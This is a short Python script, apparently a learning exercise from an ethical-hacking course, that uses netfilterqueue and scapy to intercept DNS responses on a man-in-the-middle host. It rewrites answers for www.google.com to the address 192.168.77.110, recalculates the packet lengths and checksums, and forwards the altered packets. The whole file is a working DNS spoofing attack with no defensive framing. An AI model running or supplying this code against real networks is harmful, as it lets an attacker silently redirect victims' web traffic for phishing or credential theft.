#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from scapy.layers.dns import DNSQR


def mod_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #changeing bytes to scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):
        qname=scapy_packet[scapy.DNSQR].qname

        if "www.google.com".encode('utf-8') in qname:
            print("++++spoofing++++")
            print(scapy_packet.show())
            answer = scapy.DNSRR(rrname =qname, rdata = "192.168.77.110")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            scapy_packet[scapy.DNS].nscount = 0

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            print("\n\n+++++ALL MODIFICATION++++\n\n")
            print(scapy_packet.show())

            packet.set_payload(bytes(scapy_packet))
    packet.accept()
"""After applying all modification im changing this packets to bytes"""




        #print(scapy_packet.show())


    #packet.drop() this drp the packets

print("starting +++++++")
queue= netfilterqueue.NetfilterQueue()        #created a object
queue.bind(0, mod_packet)                #same queue id and call func() to packets
queue.run()                             #creating a queue which is communicate with lkernal queue and take packets of there to here
